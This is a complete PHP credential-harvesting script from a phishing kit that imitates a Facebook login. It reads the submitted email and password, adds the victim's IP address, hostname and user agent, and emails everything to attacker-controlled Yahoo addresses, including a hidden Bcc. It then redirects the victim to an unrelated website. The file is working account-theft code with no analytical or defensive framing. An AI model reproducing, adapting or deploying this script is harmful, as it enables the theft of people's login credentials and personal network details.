<?php



if(isset($_POST["email"]) & isset($_POST["pass"]));

$email = $_POST["email"];
$pass = $_POST["pass"];



	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| FB ACCT |--------------|\n";
	
	$message .= "email              : ".$email."\n";
	$message .= "pass              : ".$pass."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY ETH --------------|\n";
	

    
    	$send =  "computerapps@yahoo.com";
    	$headers = array(
    	'From' => 'info@hosttum.com',
    	'Bcc' => 'ernestjackson03@yahoo.com',
    	'Reply-To' => 'reply@hosttum.com',
    	'X-Mailer' => 'PHP/' . phpversion());
	
	$subject = "FB Account - Connect : $ip";
	$headers = implode("\r\n", $headers);
    	mail($send, $subject, $message, $headers);


header('Location: https://cmmodels.com/agency/application/');
exit;

?>
